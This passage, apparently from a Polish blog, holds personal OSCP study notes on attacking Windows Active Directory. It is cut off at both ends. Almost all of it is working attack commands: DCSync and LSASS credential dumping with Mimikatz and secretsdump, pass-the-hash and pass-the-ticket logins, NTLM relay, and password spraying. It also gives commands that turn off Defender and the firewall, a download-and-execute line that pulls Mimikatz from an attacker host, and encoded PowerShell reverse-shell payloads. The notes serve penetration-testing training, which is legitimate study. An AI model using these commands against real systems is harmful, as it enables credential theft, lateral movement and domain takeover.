czas)<br>#<mark style="background-color:#b0ff9e" class="has-inline-color">Find-DomainShare -CheckShareAccess</mark> (tylkodla nas)<br>#ls \dc1.corp.com\sysvol\corp.com\  (warto sprawdzi na DC, zwlaszcza folder SYSVOL)   #&gt; haslo w pliku old-policy-backup.xml   #&gt; na Kalim decypt hasła: gpp-decrypt „+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE”</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="GPO_zasady_grupy_OU" ez-toc-data-id="#GPO_zasady_grupy_OU"></span>GPO (zasady grupy) &amp; OU<span class="ez-toc-section-end"></span></h4>



<p><em>Polityka haseł, jakie programy można używać, czy USB itp.</em></p>



<p>#xx<br><strong>###PowerView###</strong><br>#Get-DomainPolicy<br>#(Get-DomainPolicy).”system access”<br>#(Get-DomainPolicy).”kerberos policy” (Will show us the policy configurations of the Domain about system access or kerberos)<br>#Get-DomainGPO<br>#Get-DomainGPO -ComputerName client251 (wcześniej: aby poznać nazwe kompa: hostname; możesz też inne maszyny w sieci np. DC01 dla DC01.corp.com ; chociaz z domena tez działa)<br>#Get-ForestGlobalCatalog (przy okazji jest IP kontrolera domeny)<br>#Get-DomainOU<br>#Get-DomainGPO -Properties DisplayName,CN<br>#Get-DomainGPO -ComputerIdentity adres_FQDN (Get GPO applied to system)<br><strong>###Group Policies###</strong><br>#Get-NetGPO<br>#Get-NetGPOGroup (Shows active Policy on specified machine)<br><strong>###Enum OUs###</strong><br>#Get-NetOU -FullData<br><strong>###S1REN lab###</strong><br>#tutaj ten <a href="https://3haker.pl/vault-walkthrough-with-s1ren-pg-practice-hack-a-thon/">lab</a> wraz z uzyciem SharpGPOAbuse.exe, do dodania swojego usera jako local admina (chociaz u mnie te polecenia nie działały)<br><strong>###Inne###</strong><br>#AppLocker z PowerView: Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="PTH" ez-toc-data-id="#PTH"></span>PTH:<span class="ez-toc-section-end"></span></h4>



<p><em>Zdobycie hasha hasła usera w domenie.</em> <em>Skróty haseł są wszędzie tam gdzie ktoś się logował.</em> <em>Pobranie hashy z pamięci wymaga<strong> Administratora Lokalnego</strong>.</em></p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93DCSync" ez-toc-data-id="#–DCSync"></span>–DCSync<span class="ez-toc-section-end"></span></h5>



<p><em>Działa jeżeli masz konto z uprawnieniami do replikacji (czesto wlaczone jezeli jest wiecej niz 1 kontroler i musi byc synchronizacja). Exploit który pozwala wyciągać dane z kontrolera domeny. Wykorzystuje lukę w mechanizmie replikacji. Najcześciej: podszywanie się pod DC i proszenie o hasła kont z pamięci kontrolera, także NTLM konta krbtgt!</em> Użyj: secretsdump na $IP-DC</p>



<p><strong>###PowerView###</strong><br>#$d = Get-ObjectACL „DC=corp,DC=com” -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll’) -or ($_.ObjectAceType -match 'Replication-Get’)} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value ; Convert-SidToName $d (check DCSync Rights)<br>#Get-ObjectAcl „DC=corp,DC=com” -ResolveGUIDS | {($_.objectAceType -like 'DS-Replication*’) -and ($_.SecurityIdentifier -match 'MOJE-SID’) }<br><strong>###Impacket <a href="https://github.com/fortra/impacket/tree/master/examples">secrets.py</a>###</strong><br>#sudo python2 secretsdump.py corp/offsec:’Password123!’@10.10.10.10<br><strong>###Mimikatz – ale musisz być obiektem z prawami do replikowania###</strong><br>#<mark style="background-color:#a0ff8b" class="has-inline-color">lsadump::dcsync /domain:security.local /all</mark><br>#lsadump::dcsync /domain:security.local /user:krbtgt (lub inny user którego skrót chemy pozyskać)<br>#lsadump::lsa /patch<br>#Invoke-Mimikatz -Command '”privilege::debug” „token::elevate” „sekurlsa::logonpassword” „lsadump::sam” „exit”’ (musisz być Lokalnym Administratorem ELEVATED!!!! (musisz Disabele Firewall i AV))<br>#Pobrane NTLM hashe łatwo łamie na&nbsp;<a href="https://crackstation.net/">https://crackstation.net/</a><br><strong>###Invoke-Mimikatz.ps1###</strong><br>#invoke-mimikatz -Command '”lsadump::desc /user:corp\administrator”’ (jeżeli jest podatność do zrzuci nam NTLM administratora)<br><strong>###Empire###</strong><br>#usemodule credentials/mimikatz/dcsync_hashdump<br><strong>###Invoke-DCSyns.ps1###</strong><br>#Importmodule Invoke-DCSync.ps1 #&gt;Invoke-DCSync -PWDumpFormat (tworzy tabele z hashami jeżeli jest dostęp)<br><strong><mark style="background-color:#f4a4ff" class="has-inline-color">###oscp23###</mark></strong><br>#Mimikatz jako admin #&gt; <mark style="background-color:#b2ffa1" class="has-inline-color">lsadump::dcsync /user:corp\dave</mark> (lub zamiast dave inny ktorego hash  chcemy pozyskać np. administrator)  #&gt;  skopiuj NTLM do pliku hashes.dcsync  #&gt;  hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force<br>#——–impacket-secretsdump<br>#<mark style="background-color:#a7ff93" class="has-inline-color">impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:”BrouhahaTungPerorateBroom2023\!”@192.168.204.70</mark> (chyba musimy miec creds jakiegos usera w domenie a wskazujemy dave mozemy tez zamiast niego dac innego usera lub krbtgt ; chyba  credsy usera ktory ma takie uprawnienia ; IP kontrolera domeny)<br>#NTLM hash to jest końcówka po : xxxxx i przed :::</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93LSASS" ez-toc-data-id="#–LSASS"></span>–LSASS<span class="ez-toc-section-end"></span></h5>



<p><em>Zaglądanie do pamięci programy lsass.exe, musisz mieć wysokie uprawnienia.</em></p>



<p>#Mimikatz: sekurlsa::logonpasswords<br>#tasklist /fi „Imagename eq lsass.exe” (Get lsass.exe PID)<br>#&gt; C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump \Windows\Temp\lsass_dump.dmp full (Call comsvcs.dll and dump to file ; te pliki dll i exe sa juz na maszynie)<br>#Invoke-Mimikatz -Command „sekurlsa::Minidump lsass_dump.dmp”<br>#Invoke-Mimikatz -Command „sekurlsa::logonPasswords /full”<br><strong>###Mimikatz###</strong><br>#Invoke-Mimikatz -DumpCreds<br>#mimikatz.exe<br>#sekurlsa::minidump /users/admin/Desktop/lsass.DMP<br>#sekurlsa::LogonPasswords<br>#meterpreter &gt; getprivs<br>#meterpreter &gt; creds_all<br>#meterpreter &gt; golden_ticket_create<br><strong>###Procdump (sysinternals)###</strong><br>#.\procdump.exe -accepteula -ma lsass.exe lsass_dump<br>#&gt; Mimikatz can then be used to pull information from the lsass_dump.dmp file: Invoke-Mimikatz -Command „sekurlsa::Minidump lsass_dump.dmp” #&gt; Invoke-Mimikatz -Command „sekurlsa::logonPasswords /full”<br><strong><mark style="background-color:#f6b7ff" class="has-inline-color">###oscp23###</mark></strong><br>#omijanie AV dla Mimikatz to: wtryskiwanie całego mimikatz do PowerShell, użyj Managera zadań do zrzutu całej pamięci LSASS na inna maszyne i dopiero na niej mimikatz<br>#&gt;Powershell jako Administrator<br>#&gt; .\mimikatz.exe #&gt; privilege::debug  #&gt;  <mark style="background-color:#c7ffba" class="has-inline-color">sekurlsa::logonpasswords </mark> (pobierze skróty wszystkich zalogowanych na tej maszynie lub serwerze)<br>#&gt; w nowym oknie PS otwiera share: dir \\web04.corp.com\backup<br>#&gt;w mimikatz: sekurlsa::tickets  (nie ma nic do kopiowania ale jest podzial na TGS i TGT)<br>#piszą coś o certyfikatach w mimikatz: crypto::capi    ;    crypto::cng</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93Wykorzystanie_hasha" ez-toc-data-id="#–Wykorzystanie_hasha"></span>–Wykorzystanie hasha<span class="ez-toc-section-end"></span></h5>



<p>#<mark style="background-color:#b5ffa4" class="has-inline-color">xfreerdp /u:offsec /d:win2012 /pth:HASH /v:$IP</mark><br>#xfreerdp /v:$IP /u:offsec /d:corp.com /pth:’HASH’ /h:1010 /w:1920<br>#<mark style="background-color:#b5ffa4" class="has-inline-color">evil-winrm -i $IP -u offsec -H $HASH</mark> (ps. po zalogowaniu skorzystaj z menu #&gt; np. services)<br>#crackmapexec smb $IP -u offsec -H $Hash -x „whoami”<br>#crackmapexec smb $IP -u offsec -H $Hash -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f’<br>#Mimikatz: sekurlsa::pth /user:offsec /domain:corp.com /ntlm:HASH (otworzy nowe cmd ale na tego sameo usera, zadziała nam jednak w nim: PsExec.exe \\DC01 cmd.exe )<br>#sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe<br>#Invoke-Mimikatz -Command '”sekurlsa::pth /user:Administrator /domain:corp /ntlm:HASH /run:powershell.exe”’<br>#net use \\DC01 (to na koniec, próba wygenerowania Ticketu z hasha)<br><strong>###Crackmapexec###</strong><br>#crackmapexec smb $IP -u „offsec” -H „HASH” –ntds<br>#crackmapexec smb $IP -u „offsec” -H „HASH” –ntds –user offsec<br><strong>###Impacket###</strong><br>#<mark style="background-color:#c9ffbd" class="has-inline-color">impacket-wmiexec corp.com/Administrator@192.168.209.10 -hashes  :25xxxxxxxxxx</mark> (logowanie do konsoli kontrolera domeny ; po slowie hashes jest spacja i dopiero 🙂<br>#impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b corp.com/Administrator@192.168.209.10 (LMHash:NTHash we don’t know lmhash so we use 32 x 0)<br><strong>###Mimikatz###</strong><br>#Invoke-Mimikatz -Command '”sekurlsa::pth /user:Administrator /domain:corp /ntlm:HASH /run:powershell.exe”’ (da mi to NT System na lokalnej maszynie, Ps. nowe okno można zmienić Buffer height np. 3000)<br>#&gt; .\PsExec.exe \\DC01 cmd.exe<br><strong>###Co dalej możesz###</strong><br>#Invoke-Command -ComputerName DC01 -ScriptBlock{whoami; whoami /groups; hostname}<br>#mój pomysł na przeglądanie zawartości komputera: Invoke-Command -ComputerName DC01 -ScriptBlock{cd c:\Users\jeff_admin ;dir}<br>#iex (New-Object Net.Webclient).DownloadString(’http://$KALI-lub$WIN1/Invoke-Mimikatz.ps1′); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds (pobranie na nową maszyne Mimikatz: wcześniej uruchomił HFS na pierwszym Windowsie)<br>#lub osobno po pobraniu Mimikatz: Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds &gt; dump.txt<br><strong>###Wyłączanie AV i sesja na nowej maszynie:</strong><br>#$sess = New-PSSession -ComputerName DC01<br>#&gt; Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess<br>#&gt; Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess<br>#&gt; Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess<br>#&gt; Enter-PSSession $sess (i jesteśmy administratorem na DC01)<br><strong>###Usunięcie zabezpieczeń:</strong><br>#Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections<br>#Set-MpPreference -DisableRealtimeMonitoring $true<br>#Set-MpPreference -DisableIOAVProtection $true<br>#netsh advfirewall set allprofiles state off<br><strong>###oscp23 wczensiej###</strong><br>#mimikatz zadziała kiedy jesteśmy Administratorem i mamy uprawnienia SeDebugPrivilege<br>#ewentalni Elevate możemy zrobic wykorzystując uprawnienia SeImpersonatePrivilege lub przez PsExec<br>#PS: Get-LocalUser (sprawdza userow na maszynie)<br>#uruchamia PS jakoadministrator i odpala ./mimikatz.exe #&gt; <strong>privilege::debug </strong>(sprawdza czy amy uprawnienia) #&gt; token::elevate (aby podniesc uprawnienia ) #&gt; lsadump::sam (bo pobierze same NTLM lokalnych userów,w przeciwieństwie do sekurlsa::logonpasswords ktory pobiera wszystko)  #&gt; pobieramy NTLM hash do pliku i hashcat szukamy hasła: hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force<br>#smbclient \\192.168.50.212\secrets -U Administrator –pw-nt-hash $HASH<br>#<mark style="background-color:#b2ffa1" class="has-inline-color">impacket-psexec -hashes 00000000000000000000000000000000:$HASH Administrator@$IP</mark>(te 32 zera 0 sa na stałe kiedy używamy NTLM hasha ; polecenie robi shella jako System a wiec wysokie ; oczywiscie zamiast Administrator moze byc inny login)<br>#impacket-wmiexec -hashes 00000000000000000000000000000000:$HASH Administrator@$IP (teź shel ale na innym protokole chyba)<br>#Net-NTLMv2 działa analogicznie jak Kerberos ale jest starszy  #&gt; uzyskuje reverse-shell poprzez bład na porcie 4444 krb524: nc 192.168.189.211 4444 (ps. ale pisza ze mozna tez korzystac ze strony web z uploadem z URL: \\192.168.119.2\share\nonexistent.txt.) #&gt; uruchamiany nasłuchiwanie Responderem na Kalim: sudo responder -I tun0  (edycja protokołów w /usr/share/responder/Responder.conf i jakaś opcja Respond to powinna byc wlaczona ; z samym przełącznikeim -A i interfejsem  zbiera hashe ; jezeli jest cache starych polaczen to usun plik Responder.db ; w folderze /responder/logs ladnie zapisuje hashe) #&gt; na Windowsie probujemy uzyskac dostęp do nieistniejącego pliku na Kalim : dir \\192.168.119.2\test #&gt; w Responderze pojawia nam sie hash usera #&gt; kopiujemy hash do pliku i hashcat: hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt –force  (a może nawet prościej: john hashes.txt –wordlist=/usr/share/wordlists/rockyou.txt) #&gt; mamy hasłoa wiec do RDP<br>#Atak że Kali otrzyma polaczenie z maszyny nr 2 i wykorzysta je do uwierzytelnienia sie na maszynie 1 i wkonaniu na niej komend: sudo impacket-ntlmrelayx –no-http-server -smb2support -t 192.168.50.212 -c „powershell -enc $TUTAJ-BASE64_<a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">TEGO</a>-PAYLOADU” (kali bedzie nasluchowac polaczenia z maszyny 2 i wykorzysta polaceniedo wykonana komendy rev-shell na maszynie nr 1 ; ps. mi wskazany payload nie zadzialal, ale wyszlo z <a href="https://3haker.pl/revshell-dla-powershell-z-uzyciem-pwsh/">tym</a>)  #&gt;  nc -nvlp 9090 (na klaim) #&gt;  teraz bind rev-shell ale n  2gim komputerze ofiary: nc 192.168.50.211 5555 #&gt; i w cmd 2giej kompa połączenie z naszym Kalim: dir \\192.168.119.2\test #&gt; na kalim impacket odbiera polaczenie i wykonuje na maszynie nr 1<br><strong><mark style="background-color:#ef9dff" class="has-inline-color">###oscp23###</mark></strong><br><strong>#—- Pass The Hash</strong><br>#nie dziala w przypadku uwierzytelniania Kerberos<br>#metoda zadziala jak jestes lokal adminem i jak polaczenie SMB przejdzie przez firewall i jest wlaczone udostepnienie drukarek i musi byc dostep do ADMIN$<br>#<mark style="background-color:#c2ffb4" class="has-inline-color">/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73</mark>  (logowanie do konsoli kontrolera domeny, jeżeli IP jest DC)<br><strong>#—- Overpass The Hash</strong> (oscp23)<br>#skrót NTLM zamieniamy &gt;&gt; na bilet Kerberos TGT!<br>#PS: klist (i nie ma ticketów)  #&gt; uruchom np. notatnik jako inny user (shift + left click #&gt; rigth click : Run us different user)  #&gt; teraz dane sa na maszynie<br>#mimikatz:   <mark style="background-color:#c2ffb4" class="has-inline-color">privilege::debug</mark>  #&gt; <mark style="background-color:#bfffb1" class="has-inline-color">sekurlsa::logonpasswords</mark>  (bedzie tez NTLM jen jako ktora uruchomilismy w/w notatnik)<br>#&gt; <mark style="background-color:#a9ff96" class="has-inline-color">sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</mark><br>#&gt; otwiera sie nowe okno PS gdzie mozemyrobic komendy jako jen  (samo whoami pokaze starego usera!!)<br>#&gt; jako jen : net use \\files04  (aby wygenerować TGT)<br>#&gt; klist (powinno pokazac teraz bilety)<br>#&gt; teraz mozemy uzywac aplikacji korzystajacych z TGT np: .\PsExec.exe \\files04 cmd<br>#&gt; lub na Kalim respinder i tutah dir \\$KALI ; patrz w/w<br></p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Wykorzystanie_hasla" ez-toc-data-id="#Wykorzystanie_hasla"></span>Wykorzystanie hasła:<span class="ez-toc-section-end"></span></h4>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93Password_cracking" ez-toc-data-id="#–Password_cracking"></span>–Password cracking<span class="ez-toc-section-end"></span></h5>



<p>#hashcat -m 400 -a 0 hash rockyou.txt<br>#<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat</a> -m 1000 dump.txt -o output.txt –remove -a 3 ?u?l?l?d?d?d?d (Brute force crack for NTLM hashes with an uppercase, lowercase, lowercase, and 4 digit mask)<br>#hashcat -m 1000 -a 0 hashes.txt [path/to/wordlist.txt] -o cracked.txt<br>#john –wordlist=[path/to/wordlist.txt] hashes.txt</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93Password_Spray" ez-toc-data-id="#–Password_Spray"></span>–Password Spray:<span class="ez-toc-section-end"></span></h5>



<p><strong><mark style="background-color:#ffaaf8" class="has-inline-color">###oscp23###</mark></strong><br>#net accounts (sprawdz po ilu nieudanych probach blokuja konto i na ile minut)<br>#<a href="https://3haker.pl/skrypt-w-ps-ktory-robi-password-spray/">tutaj</a> skrypt powershell ktory sprawdza spray credsy dla usera w całym AD<br>#.\Spray-Passwords.ps1 -Pass Nexus123! -Admin  (wczesniej -ep bypass  ; nie trzeba nazwy userow bo chyba sam pobiera)<br>#strategia: znajdz jakies haslo,a pozniejsprawy aby zobaczyc czy inny user tez takie ma<br>#<mark style="background-color:#acff99" class="has-inline-color">crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!’ -d corp.com –continue-on-success</mark> (bardziej halasliwa metoda  ;  mozna tez zakres …72-76)</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93Narzedzia" ez-toc-data-id="#–Narzedzia"></span>–Narzędzia<span class="ez-toc-section-end"></span></h5>



<p>#psexec.py corp.com/offsec:lab@$IP (może uzyskasz NT/System)</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93WMI" ez-toc-data-id="#–WMI"></span>–WMI<span class="ez-toc-section-end"></span></h5>



<p><em>WMI – Windows Management Instrumentation, ułatwia automatyzacje zadań</em>. <em>Komunikuje się czesto przez 135 RPC.</em><br><em>wmic nidawno został wycofany, ale mozna podbnie przez PowerShell</em></p>



<p><strong><mark style="background-color:#ffb9f9" class="has-inline-color">###oscp23###</mark></strong><br>#musisz byc uzytkownikiem domey i lokalnym administratorem.<br>#cmd: wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create „calc”  (to na maszynie 73 uruchamia kalkulator  ;   wmic jest juz chyba blokowany przez Microsoft)<br>#ponieważ wmic w nowym Windows juz nie dziala to stosujemy Powershell (zapisz jako .ps1 lub uruchom w Powershell ISE <a href="https://3haker.pl/kod-powershell-jako-alternatywa-wmic-do-polaczenia-z-inna-maszyna-i-rev-shell/">ten</a> kod)<br><strong>#—- robienie rev-shell (zamiast uruchamiania calc):</strong><br>#tworzymy na kalim plik encode.py z <a href="https://3haker.pl/kod-python3-encode-py-do-revshell/">takim</a> .py kodem (podmieniamy tylko IP i port na Kali) i odpalamy go aby wygenerował payload powershell: python3 encode.py<br>#na Kalim nasluch<br>#w PS z payloadem na <strong>rev-shell</strong>:</p>



<pre class="wp-block-code"><code>$username = '<strong>jen</strong>';
$password = '<strong>Nexus123!</strong>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <strong>192.168.206.73</strong> -Credential $credential -SessionOption $Options 
$command = '<strong>powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA</strong>';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};</code></pre>



<p>#&gt; i bedzie po chwili mial rev-shella na Kalim</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93WinRM" ez-toc-data-id="#–WinRM"></span>–WinRM<span class="ez-toc-section-end"></span></h5>



<p><mark style="background-color:#f9bcff" class="has-inline-color">###oscp23###</mark><br>#<mark style="background-color:#c0ffb2" class="has-inline-color">winrs -r:files04 -u:jen -p:Nexus123! „cmd /c hostname &amp; whoami”</mark> (-r to host ; sprawdzamy czy działa)<br>#do <strong>rev-shella</strong> (wygenerowany z w/w encode.py): <mark style="background-color:#d2ffc8" class="has-inline-color">winrs -r:files04 -u:jen -p:Nexus123! „powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD…<br>HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA”</mark><br><strong>###Wykorzystanie poświadczeń do stworzenie sesji zdalnej przez WinRM chyba z innym komputerem oscp23:###</strong><br>#&gt; $password = ConvertTo-SecureString „<em>qwertqwertqwert123!!</em>” -AsPlainText -Force<br>#&gt; $cred = New-Object System.Management.Automation.PSCredential(„<em>daveadmin”</em>, $password)<br>#&gt; Enter-PSSession -ComputerName <em>CLIENTWK220</em> -Credential $cred (i masz sesje na innej maszynie)<br>#&gt; jak mamy możliwość WinRM to lepiej użyć narzędzia: <mark style="background-color:#bcffad" class="has-inline-color">evil-winrm -i 192.168.50.220 -u daveadmin -p „qwertqwertqwert123\!\!”</mark>  (ps. po zalogowaniu skorzystaj z menu #&gt; np. services)<br>#warto uzywac z okresleniem folderu na kalim gdzie mamy skrypty np. exe: -e '/home/kali/tools/win/’<br>#menu<br>#np. po zalogowaniu Invoke-Binary /home/tools/win/met.exe param1, param2 (jezeli przy laczeniu evil-winrm uzyles przelacznika: -e '/home/kali/tools/win/’  ;  param opcjonalnie w zaleznosci jak działa .exe)<br>#evil-winrm -i $IP -c /PATH/TO/CERTIFICATE/$CERTYFIKAT.crt -k /PATH/TO/PRIVATE/KEY/$KLUCZ.key -p -u -S</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%94_EnterPSSSession" ez-toc-data-id="#—_EnterPSSSession"></span>— EnterPSSSession<span class="ez-toc-section-end"></span></h5>



<p>#kod Powershell ISS do zrobienia sesji na innej maszynie:</p>



<pre class="wp-block-code"><code>$username = '<strong>jen</strong>';
$password = '<strong>Nexus123!</strong>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <strong>192.168.206.73</strong> -Credential $credential
(osobno poniższe Enter... ale może ID sesji zmienić się z 1 na np. 4)
Enter-PSSession 1</code></pre>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93PsExec" ez-toc-data-id="#–PsExec"></span>–PsExec<span class="ez-toc-section-end"></span></h5>



<p><em>Do zdalnego wykonywania procesów na innych maszynach, z pakietu Sysinternals.</em></p>



<p>#warunki do uzywania: lokalny admin i ADMIN$ musi byc dosteony i tez udostepniania plikuów i drukaek wlaczone.<br>#.<mark style="background-color:#b7ffa7" class="has-inline-color">/PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd</mark></p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="PTT" ez-toc-data-id="#PTT"></span>PTT:<span class="ez-toc-section-end"></span></h4>



<p><em>Używanie skradzionego biletu Kerberos i podszywanie się pod kogoś innego.</em> <em>Dopisywanie tego biletu do swojej sesji.</em></p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93Podstawy" ez-toc-data-id="#–Podstawy"></span>–Podstawy<span class="ez-toc-section-end"></span></h5>



<p>#request service ticket: Add-Type -AssemblyName System.IdentityModel<br>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList<br>’HTTP/CorpWebServer.corp.com’<br>#po w/w: klist<br>#sudo apt update &amp;&amp; sudo apt install kerberoast #&gt; (łamanie biletu serwisowego) python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000- Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi<br>#Invoke-Kerberoast.ps1 z <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">git</a> (opis <a href="https://3haker.pl/ataki-na-ad-cd/">oscp</a>)<br>#Spray-Passwords.ps1 z <a href="https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1">git</a> np. .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin<br>#pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd<br>#sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe<br>#.\PsExec.exe \\dc01 cmd.exe<br><strong>###Kekeo – niewykrywalny przez AV###</strong><br>#kekeo.exe<br>#kerberos::list (wyświetli aktualne bilety, możliwe że będzie tylko naszego usera)<br>#tgt::deleg (kopiowanie biletów do pliku na dysku)<br>#Jeżeli mamy plik z ticketem: kerberos::ptt [Ticket-Name.kirbi] (Pass ticket into current session)<br>#teraz możesz psrwadzic np. w przeglądarce: \\DC01\C$<br><strong>###Rubeus###</strong><br>$.\<a href="https://3haker.pl/active-directory-from-kali-udemy-cz-5-rdp/#Rubeus">Rubeus</a>.exe klist ; triage ; dump (po dump szukaj czy masz dług ciąg znaków po Base64EncodedTicket)<br>#.\Rubeus.exe ptt /ticket:DLUGI-TICKET-TUTAJ (bilet zaimportowany, możesz sprawdzić klist)<br>#Odczytanie plików z Kontorela Domeny: na Windows znajdź program Run #&gt; wpis: \\DC01\c$ (lub cd) i jak masz login i hasło to otworzt ci folder.<br>#Odpalanie CDM innej maszyny u siebie: Enter-PSsession -ComputerName DC01 -Credential corp\administrator<br>—<br>#Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe /show (Create new LUID session (Requires Elevation))<br>#&gt; Rubeus.exe ptt /luid:[LUID from previous command] /ticket:[Base64 ticket]<br>LUB 2-ga metoda (do obecnej sesji):<br>#Rubeus.exe ptt /ticket:[Base64 ticket]<br><strong>###Invoke-Rubeus jak w/w###</strong><br>#Invoke-Rubeus -Command „createnetonly /program:c:\windows\system32\cmd.exe /show” #&gt; Invoke-Rubeus -Command „ptt /luid:[LUID from previous command] /ticket:[Base64 ticket]”<br># 2-ga metoda (do pobecnej sesji): Invoke-Rubeus -Command „ptt /ticket:[Base64 ticket]”<br><strong>###Mimikatz.exe###</strong><br>#kerberos::ptt [Ticket-Name.kirbi] (Pass ticket into current session)<br>#kerberos::list (Confirm if ticket has been stored)<br>#misc::cmd (Open new session with injected ticket)<br>—<br>#mimikatz.exe<br>#mimikatz # sekurlsa::tickets /export<br>#mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-$IP.LOCAL.kirbi<br>#klist<br>#dir \$IP\admin$<br><strong>###Invoke-Mimikatz###</strong><br>#invoke-mimikatz -Command '”Mimikatz::debug” „sekurlsa::tickets /export” „exit”’ (generuje pliki w folderze)<br>#klist<br>#bilety mamy w sesji, sprawdzenie: dir \\DC01\\c$<br>#invoke-mimikatz -Command '”Mimikatz::debug” „kerberos::ptt xxkrbtxxcorpx.kirbi” „exit”’<br>#Invoke-Mimikatz -Command '”kerberos::ptt [Ticket-Name.kirbi]”’<br>#Invoke-Mimikatz -Command '”kerberos::list”’<br>#Invoke-Mimikatz -Command '”misc::cmd”’<br><strong>###Co dalej###</strong><br>#klist #&gt; NIE otwiera sie nowe okno powershell, korzystaj z tego co jestes #&gt; dir //DC01/c$ lub:<br>#Invoke-Command -ComputerName DC01 -ScriptBlock{whoami; whoami /groups; hostname}<br>#Enter-PSSession -ComputerName DC01<br>#Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections<br>#Set-MpPreference -DisableRealtimeMonitoring $true<br>#Set-MpPreference -DisableIOAVProtection $true<br>#netsh advfirewall set allprofiles state off<br><strong><mark style="background-color:#ffbafa" class="has-inline-color">###oscp23###</mark></strong><br>#w nowym oknie PS otwiera share: dir \\web04.corp.com\backup<br>#&gt;w mimikatz: sekurlsa::tickets  (nie ma nic do kopiowania ale jest podzial na TGS i TGT)<br>#—- nowe o TGS<br>#o ile TGT można wykorzystać TYLKO na maszynie na ktorej został stworzony do TGS można eksportować i rożnie wykorzystywać  +  TGS danego usera nie wymaga konto admina<br>#sprawdzamy ze nas user nie ma dostepu tutaj: ls \\web04\backup<br>#mimikatz: privilege::debug  #&gt;  <mark style="background-color:#bcffad" class="has-inline-color">sekurlsa::tickets /export</mark><br>#&gt; ponieważ zależy nam na dostanio się do web04 szukamy pliku usera do tego zasoby np. …dave@cifs.web04.kirbi  #&gt; kopiuje cala nazwe pliki np. 